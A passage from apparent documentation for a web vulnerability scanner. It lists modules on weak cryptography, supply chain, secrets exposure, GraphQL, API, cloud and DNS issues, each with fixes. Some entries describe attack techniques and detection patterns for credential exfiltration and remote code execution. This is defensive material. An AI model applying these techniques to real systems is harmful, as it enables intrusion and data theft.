Detects weak cryptographic implementations: MD5/SHA-1 (cryptographically broken; MD5 has known collisions; SHA-1 has SHAttered prefix collisions), DES/3DES/RC4/Blowfish ciphers (DES brute-forceable in hours; RC4 biases exploited in BEAST/POODLE; 3DES has Sweet32), AES-ECB mode (pattern-preserving; identical plaintext blocks produce identical ciphertext), Math.random() for security secrets (52-bit PRNG; predictable from output), hardcoded IVs (breaks AES-CBC/GCM confidentiality/integrity), short RSA keys (512/1024-bit; nation-state breakable), and time-based PRNG seeds.

**How to fix:**
- Use SHA-256 or SHA-3 for integrity; bcrypt/argon2/scrypt for password hashing
- Use AES-256-GCM for encryption with a random 96-bit IV per message
- Replace Math.random() with crypto.getRandomValues() (browser) or crypto.randomBytes() (Node.js)
- Use RSA-2048 minimum or ECC P-256 for asymmetric cryptography
- Never hardcode IVs; generate a fresh random IV for each encryption operation

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html) · [↗](https://cwe.mitre.org/data/definitions/327.html)

---

### 125. Compression Oracle (BREACH/CRIME) Risk
**Module:** `compression_oracle` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-311**

BREACH: HTTP-level gzip/br compression on HTTPS responses containing secrets enables oracle attack Attacker with network position injects reflected input and measures compressed response size to recover CSRF tokens byte-by-byte CRIME: TLS-level compression (DEFLATE) similarly leaks secrets from request headers (cookies, auth tokens) Session tokens, CSRF tokens, and anti-forgery values in compressed responses are all potential targets

**How to fix:**
- Disable HTTP compression for responses containing secrets (CSRF tokens, session data)
- Implement CSRF token uniqueness per request (masked tokens) to defeat byte-at-a-time recovery
- Ensure TLS compression is disabled (modern TLS implementations disable it by default)
- Consider adding random noise padding to compressed responses containing sensitive tokens

---

## Supply Chain & Dependencies

*8 scanners in this category.*

### 126. Import Assertions Security
**Module:** `import_assertions_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-94**

Import Assertions / Module Attributes misuse — dynamic import() URL from URL parameter with type assertion (attacker-controlled module execution), import map injected via innerHTML (module specifier hijacking), JSON module imported from path with sensitive keywords, import map maps to external URL (supply chain risk).

**How to fix:**
- Never construct dynamic import() URLs from URL parameters or user-controlled input
- Do not inject import maps via innerHTML or document.write with untrusted content
- Audit import assertions for paths that may expose sensitive data as JSON modules
- Restrict import map specifiers to same-origin or trusted CDN sources only

**References:** [↗](https://tc39.es/proposal-import-attributes/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 127. Dependency Confusion Attack
**Module:** `dependency_confusion` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-427**

Internal package names in manifests can be squatted on public npm/PyPI/RubyGems Attacker publishes a malicious package with the same name at a higher version Package manager prefers public registry — malicious code executes during install

**How to fix:**
- Use private registry scoping (@company/ prefix for npm, company-owned PyPI index)
- Pin all versions with lock files (package-lock.json, poetry.lock) verified in CI
- Register / reserve all internal package names on public registries proactively

---

### 128. Dependency Hijacking / Supply Chain Attack
**Module:** `dependency_hijacking` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-829** &nbsp;|&nbsp; **MITRE:** T1195

Detects client-side code that loads packages or modules from CDN URLs constructed from user-controlled URL parameters, dynamic require()/import() calls with attacker-controlled paths, and external script tags without Subresource Integrity (SRI) attributes. An attacker who controls the loaded package can execute arbitrary code with full page context.

**How to fix:**
- Never construct CDN URLs from URL parameters; hardcode exact package versions
- Add integrity= and crossorigin= attributes to all external <script> and <link> tags
- Use a Content Security Policy with require-sri-for script style directives
- Avoid dynamic require()/import() with any user-supplied path component

**References:** [↗](https://owasp.org/www-project-top-ten/) · [↗](https://cwe.mitre.org/data/definitions/829.html)

---

### 129. External JS Without Subresource Integrity
**Module:** `js_supply_chain_integrity` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-494**

External CDN scripts without SRI: BGP hijacking, DNS poisoning, or CDN compromise silently replaces trusted libraries Popular CDN compromise (jsdelivr, cdnjs, unpkg) can affect thousands of sites simultaneously SRI without crossorigin attribute allows CORS-blocked responses to bypass integrity checks Module preload without integrity attribute: browser pre-fetches attacker-controlled modules Dynamic import() of external URLs cannot use SRI — any URL can be imported at runtime Mixed SRI posture: one unprotected external script negates the security of all SRI-protected ones

**How to fix:**
- Add integrity='sha384-...' and crossorigin='anonymous' to all external <script> tags
- Generate SRI hashes with: openssl dgst -sha384 -binary file.js | openssl base64 -A
- Bundle third-party dependencies locally to eliminate CDN dependency entirely
- Restrict dynamic import() targets via strict script-src CSP (hash-based, no wildcards)
- Use CSP script-src with specific hashes to enumerate allowed script content

---

### 130. Import Map Dependency Confusion / Module Hijacking
**Module:** `import_map_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-829**

CDN dependency confusion: import map specifier resolves to external URL — attacker registers malicious package at CDN URL Module override: well-known package (react, lodash) mapped to attacker-controlled URL — all module imports hijacked Dynamic importmap injection: import map written via innerHTML/document.write — DOM-based module hijacking External scopes: import map scopes redirect specific paths to external origins — scoped module exfiltration Missing integrity: import map without integrity attribute allows map tampering by MitM or CDN compromise

**How to fix:**
- Use integrity attribute on import map script tags: <script type="importmap" integrity="sha384-...">
- Never inject import maps via innerHTML, document.write, or insertAdjacentHTML
- Pin external specifiers to specific CDN subresource integrity hashes rather than mutable URLs
- Prefer local bundling over import maps pointing to CDN URLs for security-critical code
- Implement CSP script-src with 'strict-dynamic' to restrict what modules can execute

**References:** [↗](https://wicg.github.io/import-maps/) · [↗](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap)

---

### 131. ES Module Import Map Security Issues
**Module:** `importmap_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-829**

External CDN module URLs without SRI in import maps: CDN compromise replaces core dependencies for all ES module imports HTTP (cleartext) module URLs in import maps: trivial MITM injection of malicious module code data: or javascript: module specifiers in import maps execute attacker code on import Global scope '/' override remaps all relative imports — high-impact if attacker-influenced Multiple import maps: only first is honoured; subsequent maps silently ignored, creating confusion

**How to fix:**
- Host ES modules on your own origin rather than external CDNs — import maps lack SRI support
- Restrict import map content via CSP script-src with hash-based allowlist
- Never allow data: or javascript: in module specifiers — enforce via CSP
- Use specific scope paths rather than '/' to avoid unintended global module remapping
- Maintain exactly one import map per page; validate JSON syntax before deployment

---

### 132. Dynamic Import Security
**Module:** `dynamic_import_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-829**

Dynamic import() misuse — module specifier from URL parameter enables attacker-controlled script injection, string concatenation in import() URL enables injection, import.meta data exfiltrated to remote endpoint.

**How to fix:**
- Never pass URL parameter values directly to import() — use an allowlist of permitted module paths
- Avoid string concatenation or template literals when building import() specifiers
- Do not transmit import.meta.url or other module metadata to external endpoints
- Implement Subresource Integrity (SRI) for dynamically imported scripts

**References:** [↗](https://tc39.es/ecma262/#sec-import-calls) · [↗](https://cwe.mitre.org/data/definitions/829.html)

---

### 133. Missing Subresource Integrity (SRI)
**Module:** `sri_advanced` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-345**

CDN scripts without SRI can be replaced with malicious code via CDN compromise or BGP hijack No integrity check means any CDN-level modification executes in all users' browsers

**How to fix:**
- Add integrity='sha384-...' and crossorigin='anonymous' to every external script/link tag
- Generate SRI hashes at build time (webpack-subresource-integrity plugin)
- Consider self-hosting critical third-party libraries

---

## Secrets & Information Disclosure

*14 scanners in this category.*

### 134. Insecure Sensitive Data Exposure in Responses
**Module:** `insecure_data_exposure` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-200** &nbsp;|&nbsp; **MITRE:** T1552

Detects sensitive data leaked in HTTP response bodies: PEM private keys, AWS access key IDs, unmasked passwords/API keys/tokens in JSON fields, credit card numbers (PCI-DSS violation), US Social Security Numbers (GLBA/state law violation), JWT tokens returned in response bodies, and internal RFC-1918 IP addresses in JSON fields.

**How to fix:**
- Never return credentials, private keys, or payment data in API responses
- Mask sensitive fields in responses (replace with asterisks or omit entirely)
- Rotate any exposed credentials immediately and audit for access during exposure window
- Remove internal network information (IPs, hostnames) from API responses

**References:** [↗](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 135. Spring Boot Actuator Endpoint Exposed
**Module:** `actuator_endpoint_exposure` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-200** &nbsp;|&nbsp; **MITRE:** T1590

Detects exposed Spring Boot Actuator management endpoints: full _links map (reveals all management endpoints with no auth), /env returning systemProperties/systemEnvironment (database passwords, API keys, cloud credentials in plaintext), /heapdump accessible (full JVM heap snapshot — every in-memory secret, session token, and decrypted credential is extractable), Prometheus metrics endpoint (request rates, error rates, connection pool state, latency percentiles without authentication), Jolokia JMX-over-HTTP (read/write MBean attributes, invoke operations including classloading and JVM shutdown), and detailed /health including db/redis/diskSpace status (infrastructure topology for reconnaissance).

**How to fix:**
- Restrict actuator exposure: management.endpoints.web.exposure.include=health,info
- Require authentication for all actuator endpoints: management.endpoint.env.enabled=false or Spring Security rules
- Never expose /heapdump or /threaddump in production
- Place actuator endpoints on a separate port bound to 127.0.0.1 only
- Disable Jolokia unless explicitly required; never expose it unauthenticated

**References:** [↗](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html) · [↗](https://owasp.org/www-project-web-security-testing-guide/)

---

### 136. Spring Boot Actuator Exposed
**Module:** `spring_actuator` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-284**

/actuator/env exposes all env vars including database passwords and API keys /actuator/heapdump gives a full JVM heap dump containing decrypted secrets Jolokia JMX bridge allows arbitrary MBean invocation → RCE

**How to fix:**
- Set management.endpoints.web.exposure.include=health,info in application.properties
- Require authentication for all actuator endpoints beyond /health and /info
- Disable sensitive endpoints: shutdown, env, heapdump, loggers, mappings

---

### 137. Long-Lived / Unrotated API Keys
**Module:** `api_key_rotation` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-321**

JWTs without expiry (exp) remain valid indefinitely after compromise — token revocation is impossible AWS/GCP/Azure keys in page responses or JS bundles are publicly readable by any visitor Basic auth credentials encoded with btoa() in JS provide a false sense of security — trivially decoded Session cookies with multi-year max-age persist after device loss or XSS, extending attack window

**How to fix:**
- Always include exp in JWTs; use short-lived access tokens (≤1 hour) with refresh token rotation
- Never embed cloud credentials in client-side code; use IAM roles and instance metadata instead
- Perform all authentication server-side — never encode credentials in client JavaScript
- Set session cookie Max-Age to match session timeout; implement server-side session invalidation

---

### 138. Secrets / Stack Traces in Error Pages
**Module:** `secret_in_error_page` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-209**

Stack traces expose internal file paths, class names, and framework versions Database connection strings in error pages reveal host, port, database name, and credentials API keys, tokens, and internal paths in error responses provide attacker footholds

**How to fix:**
- Disable debug mode / verbose error display in all production environments
- Implement a generic error page that logs full details server-side only
- Scan error responses in CI/CD pipeline with a secret-detection rule set

---

### 139. Exposed Development Artifacts
**Module:** `dev_artifact` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-538**

.git directory exposure allows cloning the full source code repository .env files expose all application secrets and database credentials Backup files (.bak, ~) contain source code potentially including hardcoded credentials

**How to fix:**
- Block .git, .env, *.bak, *.swp via web server configuration (deny from all)
- Use .dockerignore and .gitignore to exclude sensitive files from deployments
- Audit pipeline to ensure only production artifacts are deployed to web root

---

### 140. Exposed Dependency Manifest Files
**Module:** `package_manifest_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Exposed package.json reveals exact dependency versions — enables targeted CVE exploitation .npmrc with authToken: attacker can authenticate to private npm registry and inject packages composer.lock / Gemfile.lock: exact transitive dependency tree for supply chain mapping requirements.txt: Python dependency versions matching known vulnerable releases go.mod / pom.xml: precise library versions for matching against CVE databases

**How to fix:**
- Block web server access to manifest files: deny all in nginx for *.json, *.lock, *.toml
- Move .npmrc and credential files outside the web root entirely
- Serve only compiled artifacts from the web root — no source files
- Add /.npmrc, /package.json, /composer.json to robots.txt (security through obscurity only)
- Rotate any auth tokens that were exposed in accessible .npmrc files

---

### 141. Public API Documentation Exposure
**Module:** `api_documentation_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Swagger UI exposed: complete API blueprint available — attacker discovers all endpoints, parameters, auth OpenAPI spec accessible: machine-readable specification enables automated fuzzing and attack generation Sensitive endpoints in docs: /admin, /internal, /config paths revealed — direct attack surface expansion Postman collection exposed: includes environment variables with credentials, API keys, base URLs ReDoc accessible: renders full API documentation — facilitates targeted exploitation planning

**How to fix:**
- Restrict Swagger UI and OpenAPI spec endpoints to authenticated users or internal network only
- Remove documentation endpoints from production deployment or serve from separate authenticated service
- Never include credentials or API keys in Postman collections committed to repositories or served publicly
- Implement IP allowlisting for API documentation pages in WAF or reverse proxy
- Audit what endpoints are documented — remove internal/admin endpoints from public-facing docs

**References:** [↗](https://owasp.org/www-project-api-security/)

---

### 142. Health / Metrics Endpoints Publicly Accessible
**Module:** `health_endpoint_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Prometheus /metrics exposes service names, dependency topology, error rates, and queue depths Spring Boot /actuator/health reveals database host names, Redis endpoints, and component health status Go /debug/pprof exposes live profiling data including goroutine stacks with internal call paths Health endpoints reveal build versions, internal hostnames, and service dependencies for attacker mapping

**How to fix:**
- Require authentication for all health endpoints beyond a minimal /healthz that returns only HTTP 200/503
- Restrict /metrics to internal monitoring network CIDR ranges using firewall rules or VPC security groups
- Disable sensitive Spring Boot actuator endpoints: management.endpoints.web.exposure.include=health,info
- Use Kubernetes NetworkPolicies to allow /healthz probe access only from kubelet, not from the internet

---

### 143. Information Disclosure
**Module:** `info_disclosure` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Server version headers enable targeted exploit selection (CVE lookup by version) Debug endpoints left in production expose internal state and configuration

**How to fix:**
- Remove Server and X-Powered-By headers (nginx: server_tokens off; Apache: ServerTokens Prod)
- Disable all debug/dev endpoints in production builds

---

### 144. Verbose Error Pages
**Module:** `error_pages` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-209**

Stack traces expose internal file paths, class names, and framework versions SQL errors reveal database type, schema structure, and query fragments

**How to fix:**
- Use generic error pages in production — log full errors server-side, return only error IDs
- Set framework debug mode to false (Django DEBUG=False, Flask debug=False)

---

### 145. Server-Timing Internal Component Disclosure
**Module:** `server_timing_disclosure` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Server-Timing header names expose internal component stack (db, redis, auth service) Timing data reveals which backend services handle each request — aids lateral movement planning Slow operation timings (>1s) fingerprint performance characteristics for DoS targeting

**How to fix:**
- Strip Server-Timing headers at the reverse proxy/CDN layer in production
- Use generic metric names (e.g., 'total') rather than component names in timing data
- Gate Server-Timing output behind an internal-only access check

---

### 146. JavaScript Source Map Exposure
**Module:** `source_map_exposure` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-540**

Publicly accessible .map files expose full unminified source code to attackers Source maps reveal function names, business logic, secret key variables, and internal API paths sourceMappingURL comments in JS files allow automatic discovery of source map locations

**How to fix:**
- Remove sourceMappingURL comments from production JavaScript bundles
- Restrict .map file serving to authenticated internal IPs or VPN only
- Add //*.map deny rules in nginx/Apache configuration

---

### 147. Sensitive HTML Comments
**Module:** `html_comments` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-615**

Developer comments expose internal paths, credentials, and TODO security notes Version strings in comments enable targeted exploit research

**How to fix:**
- Strip all HTML comments in the production build pipeline (minification)
- Audit codebase for TODO/FIXME comments that reference security issues

---

## GraphQL

*7 scanners in this category.*

### 148. GraphQL Information Disclosure
**Module:** `graphql` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Introspection enabled in production exposes the full API schema to attackers Field suggestions reveal private types and fields even with introspection disabled Schema enumeration targets specific data types and mutations for further attacks

**How to fix:**
- Disable introspection in production; use persisted/whitelisted queries
- Disable field suggestions or return a generic 'unknown field' error message
- Implement query depth and complexity limits

---

### 149. GraphQL Advanced Attacks
**Module:** `graphql_advanced` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-400**

GraphQL IDE (GraphiQL/Playground) in production gives a full query interface to attackers Batching attacks bypass rate limiting by combining many operations in one request

**How to fix:**
- Disable GraphQL IDE in production — restrict to localhost or VPN
- Implement per-request operation count limits and query batch size limits

---

### 150. GraphQL Depth / DoS
**Module:** `graphql_depth` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-400**

Deeply nested queries consume exponential CPU/memory causing Denial of Service Alias flooding multiplies resolver execution bypassing simple query count limits

**How to fix:**
- Enforce maximum query depth (recommended: 5–7 levels)
- Enforce maximum query complexity score before execution
- Rate-limit GraphQL requests per IP / per token

---

### 151. GraphQL Batch / DoS Attack Surface
**Module:** `graphql_batch_attack` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-400**

Query batching allows bundling hundreds of auth probes into a single HTTP request, bypassing rate limiting Alias flooding multiplies expensive resolver execution N times per request — memory/CPU DoS GraphQL IDE (GraphiQL, Playground) in production gives attackers a full schema exploration interface GET-based query execution enables CSRF attacks against mutations via simple image tags

**How to fix:**
- Disable query batching or enforce a batch size limit (max 5 operations per request)
- Enforce query complexity and depth limits (graphql-query-complexity, graphql-depth-limit)
- Disable GraphQL IDE in production; restrict to localhost or authenticated users
- Require POST with Content-Type: application/json for all mutation operations

---

### 152. GraphQL CSRF Vulnerability
**Module:** `graphql_csrf` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-352**

GET mutation accepted: CSRF attack using a simple image/link tag — no CORS preflight triggered form-urlencoded accepted: cross-site form POST to GraphQL bypasses CORS preflight requirement No custom CSRF header: no X-Requested-With or anti-CSRF token required for mutations Unauthenticated mutations: state-changing operations without auth token validation Combined with CORS misconfiguration: credentials included in cross-origin GraphQL requests

**How to fix:**
- Reject mutations via GET — only accept POST with Content-Type: application/json
- Block application/x-www-form-urlencoded and multipart/form-data for GraphQL endpoints
- Require a custom header (X-Requested-With: XMLHttpRequest) that cannot be set by cross-origin forms
- Implement anti-CSRF tokens or use SameSite=Strict cookies
- Use persisted queries to prevent arbitrary mutation injection

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

---

### 153. GraphQL Information Disclosure
**Module:** `graphql_info_disclosure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Field suggestions in error messages enumerate private types and fields Stack traces in GraphQL errors reveal file paths and internal framework versions __typename access without authentication confirms GraphQL endpoint presence

**How to fix:**
- Disable GraphQL field suggestions in production; return generic 'unknown field' errors
- Suppress stack traces in error responses; log server-side only
- Require authentication before allowing any GraphQL query execution

---

### 154. GraphQL Introspection and Information Disclosure
**Module:** `graphql_introspection_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200** &nbsp;|&nbsp; **MITRE:** T1590

Detects dangerous GraphQL exposure patterns: full schema introspection enabled (__schema.types visible), mutation types discoverable, stack traces in error extensions, verbose error messages disclosing field names, interactive IDE (GraphiQL/Playground) accessible in production, and field name suggestions that allow enumeration even with introspection disabled.

**How to fix:**
- Disable GraphQL introspection in production environments
- Remove or sanitize error messages — return generic 'Internal Error' instead of schema details
- Disable stack traces in production error extensions
- Disable GraphQL IDE (GraphiQL, Apollo Studio, Playground) in production
- Disable field suggestions or implement query allowlisting

**References:** [↗](https://owasp.org/API-Security/) · [↗](https://graphql.org/learn/security/)

---

## API Security

*4 scanners in this category.*

### 155. Unauthenticated API Endpoint Access
**Module:** `api_authentication_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-306**

Exposed /api/users: full user list (email, roles) without authentication Exposed Swagger/OpenAPI docs: complete API attack surface map for unauthenticated attackers Admin API endpoints returning 200: configuration, secrets, or management functions exposed API versioning bypass: v1 requires auth, v0 does not — older version still has same functionality Debug/diagnostics API exposing environment variables, database credentials, internal paths

**How to fix:**
- Add authentication middleware to all API routes — no endpoint should default to open access
- Return 401 with WWW-Authenticate for unauthenticated requests; 403 for insufficient permissions
- Restrict Swagger/OpenAPI documentation to authenticated users or internal network only
- Implement API gateway or reverse proxy with authentication enforcement before routing
- Audit all API versions for feature parity in authorization requirements

---

### 156. Webhook Endpoint Security Issues
**Module:** `webhook_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-306**

Webhook endpoint accessible via GET allows discovery and probing without authentication Webhook endpoint echoing back payload on GET may reveal event structure and IDs Webhook debug/tunnel interface (ngrok, hookdeck, svix) exposed in production allows inspection of all webhook events HTTP (non-TLS) webhook URL means payloads (including HMAC secrets in headers) are sent in cleartext

**How to fix:**
- Webhook paths must only accept POST — return 405 for GET, HEAD, PUT, DELETE
- Never echo webhook payloads or event IDs in the HTTP response
- Disable or restrict ngrok/hookdeck/svix debug interfaces in production
- Enforce HTTPS for all webhook receiver endpoints; reject HTTP connections at the load balancer

---

### 157. JSON Security
**Module:** `json_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-502**

JSON.parse() parses URL parameter/localStorage content: attacker-controlled JSON enables prototype pollution or object injection JSON.stringify() serializes password/token/credential for fetch/sendBeacon exfiltration: credentials leaked as JSON JSON.parse() result passed to eval()/Function()/setTimeout(): parsed JSON content executed as JavaScript code JSON.parse() reviver function from URL parameter: attacker-controlled deserialization behavior injection

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON) · [↗](https://cwe.mitre.org/data/definitions/502.html)

---

### 158. JSONP Endpoint Cross-Origin Data Theft
**Module:** `jsonp_endpoint` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-829**

JSONP callback reflection: any website can steal authenticated API data with a <script src='...'> tag JSONP bypasses CORS: browser includes cookies automatically in <script> src requests Authenticated user data (email, tokens, PII) returned in JSONP response is fully readable cross-origin Callback parameter XSS: unsanitized callback value reflected as JavaScript function name JSONP used for CSRF-like data exfiltration without requiring CSRF token bypass

**How to fix:**
- Remove all JSONP endpoints; replace with CORS headers (Access-Control-Allow-Origin: trusted-origin)
- If JSONP must be maintained, validate callback values against a strict allowlist ([a-zA-Z][a-zA-Z0-9_]*)
- Add CSP script-src restrictions that prevent attacker pages from loading your JSONP endpoints
- Require anti-CSRF tokens on all state-changing API endpoints
- Audit all URL parameters for ?callback=, ?jsonp=, ?cb= patterns in server routing

---

## Cloud & Infrastructure

*4 scanners in this category.*

### 159. Public Cloud Storage Bucket
**Module:** `cloud_storage` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-284**

All files in public S3/Azure/GCS buckets are readable by anyone on the internet Exposed backups, PII, credentials, and source code can be exfiltrated silently Regulatory violation (GDPR, HIPAA, PCI-DSS) — data breach notification may be required Attackers can enumerate every object in the bucket via the listing API

**How to fix:**
- Enable S3 Block Public Access at the AWS account level (prevents all future misconfigs)
- Audit all bucket ACLs and policies — remove public-read / public-read-write grants
- Enable AWS Config rule s3-bucket-public-read-prohibited with SNS alerting
- Rotate any credentials that may have been stored in the exposed bucket
- Use AWS Macie to classify and detect sensitive data stored in S3

---

### 160. Kubernetes API / Dashboard Exposure
**Module:** `k8s_exposure` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-284**

Exposed kube-apiserver allows cluster-admin takeover without authentication Kubernetes Dashboard without auth bypasses all RBAC controls Attacker can deploy malicious containers and steal all cluster Secrets

**How to fix:**
- Enable Kubernetes RBAC and disable anonymous API server access
- Put the API server behind a VPN — never expose port 6443 publicly
- Require authentication for Kubernetes Dashboard; apply NetworkPolicies

---

### 161. Docker / Container Infrastructure Exposed
**Module:** `docker_exposure` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-284**

Exposed Docker daemon API (port 2375) allows container creation with host volume mounts — full host RCE Unauthenticated Docker registry exposes all stored container images including secrets baked into layers Container management UI (Portainer, Rancher) without MFA enables full cluster control /.dockerenv or /proc/1/cgroup accessible via web — confirms container deployment for attacker recon

**How to fix:**
- Bind Docker socket to 127.0.0.1 only (dockerd --host=tcp://127.0.0.1:2375); use TLS + client cert for remote access
- Enable Docker registry authentication; never expose :5000 or /v2/ without credentials
- Restrict Portainer/Rancher to VPN or internal network; enforce MFA
- Configure web server to deny /.dockerenv, /proc, /sys, /etc paths

---

### 162. CI/CD Secret & Config Exposure
**Module:** `cicd_exposure` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

CI config files may expose secret names, pipeline logic, and deployment targets Hardcoded credentials in CI configs give persistent access to infrastructure Build logs in accessible locations leak environment variables with secrets

**How to fix:**
- Store secrets exclusively in CI/CD secret managers (GitHub Secrets, Vault, AWS SSM)
- Never hardcode credentials in workflow files or Dockerfiles
- Restrict CI log visibility to authorized team members

---

## DNS & Network

*8 scanners in this category.*

### 163. Subdomain Takeover
**Module:** `subdomain_takeover` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-350**

Dangling DNS CNAME pointing to an unclaimed cloud service can be registered by an attacker Attacker hosts content on your subdomain — enables phishing and session cookie theft Cookies scoped to parent domain accessible from the compromised subdomain

**How to fix:**
- Remove DNS records immediately when decommissioning services
- Audit all CNAME records against active services and alert on orphaned CNAMEs
- Use __Host- prefix on sensitive cookies to prevent subdomain cookie leakage

---

### 164. Subdomain Takeover Risk
**Module:** `subdomain_takeover_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-350**

DNS CNAME pointing to deprovisioned cloud service allows anyone to claim the subdomain Subdomain takeover enables phishing on trusted company domain, cookie theft, and CSP bypass Services like GitHub Pages, Heroku, Fastly, and Azure Web Apps are common takeover targets

**How to fix:**
- Audit all DNS CNAME records — remove records for decommissioned services immediately
- Implement DNS monitoring that alerts when a CNAME target returns a takeover indicator
- Claim placeholder content on cloud platforms before deprovisioning DNS records

---

### 165. Private Network Access (PNA) Misconfiguration
**Module:** `private_network_access` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-441**

Private IP with ACAO: * allows any public site to read internal router/IoT/API data via victim's browser Localhost endpoints with wildcard CORS expose developer tools, DB admin UIs, and local services Cross-origin requests to private network bypass firewall/network segmentation via user's browser Public-to-private CORS enables SSRF-equivalent attacks without server-side request API endpoints with ACAO: * on authenticated routes expose session data cross-origin

**How to fix:**
- Remove ACAO: * from all private network endpoints; restrict to specific trusted public origins
- Implement Private Network Access (PNA) preflight handling on internal services
- Add Access-Control-Allow-Private-Network: true only where cross-origin private access is intentional
- Firewall internal services at the network level; do not rely on CORS for access control
- Enable Chrome's PNA enforcement (available in Chrome 98+) to block unauthorized preflight bypass

---

### 166. HTTP/HTTPS Protocol Confusion
**Module:** `protocol_confusion` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-319**

Site accessible on HTTP (200): MITM attacker intercepts all traffic, steals session cookies HTTP redirect to HTTP (not HTTPS): cleartext traffic never upgraded, MITM trivially intercepts credentials HTTP to HTTPS without HSTS: SSL stripping attack downgrades first-visit HTTPS handshake CSP without upgrade-insecure-requests: sub-resources requested over HTTP as mixed content Cookie set on HTTP site can override HTTPS subdomain cookies (cookie tossing via parent domain)

**How to fix:**
- Redirect ALL HTTP traffic to HTTPS with a 301 redirect at the web server level
- Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload to HTTPS responses
- Submit to the HSTS preload list at hstspreload.org for browser-level HTTPS enforcement
- Add upgrade-insecure-requests to Content-Security-Policy to upgrade HTTP sub-resources
- Ensure HTTP and HTTPS cookie attributes align; use __Secure- prefix for critical cookies

---

### 167. Email / DNS Security Misconfiguration
**Module:** `dns_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-350**

Missing SPF/DKIM/DMARC allows domain spoofing and targeted phishing via your brand p=none DMARC provides reporting only — no enforcement against spoofed email

**How to fix:**
- Publish a strict SPF record: v=spf1 include:... -all
- Enable DKIM signing on all outbound mail servers
- Set DMARC to p=quarantine then p=reject after monitoring ruf/rua reports

---

### 168. DNS Advanced Security Issues
**Module:** `dns_advanced` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-350**

Missing DNSSEC allows DNS cache poisoning and BGP hijack attacks Single nameserver provider is a single point of failure for DDoS Permissive CAA records allow any CA to issue certificates for your domain

**How to fix:**
- Enable DNSSEC — publish DS records at your registrar
- Use two independent DNS providers (split-authority NS diversity)
- Publish CAA records: 0 issue 'letsencrypt.org'

---

### 169. Sensitive Subdomains in CT Logs / Passive DNS
**Module:** `subdomain_enum_passive` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Dev/staging/admin subdomains in CT logs expose the full internal infrastructure map to attackers Jenkins, GitLab, Jira, Confluence subdomains often have weaker authentication than production Wildcard certificates mask subdomain existence, complicating monitoring and revocation Large subdomain footprint increases takeover attack surface — one decommissioned service can compromise the parent domain

**How to fix:**
- Audit all subdomains in CT logs; decommission DNS records for unused services immediately
- Require VPN or SSO for all development, CI/CD, and internal tool subdomains
- Monitor crt.sh for new certificate issuance on your domain (set up email alerts)
- Prefer specific certificates over wildcard certificates where possible

---

### 170. Network Information API Fingerprinting
**Module:** `network_information_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Connection type sent to analytics: effectiveType/downlink/rtt creates device fingerprint for cross-site tracking without cookies Adaptive payload based on connection: attacker on 'slow' network receives stripped payload with fewer security controls Third-party tracking: connection data in analytics calls enables ad networks to profile users across sites Session correlation: stable connection characteristics correlate authenticated and anonymous sessions Privacy violation: network speed reveals device location and carrier information

**How to fix:**
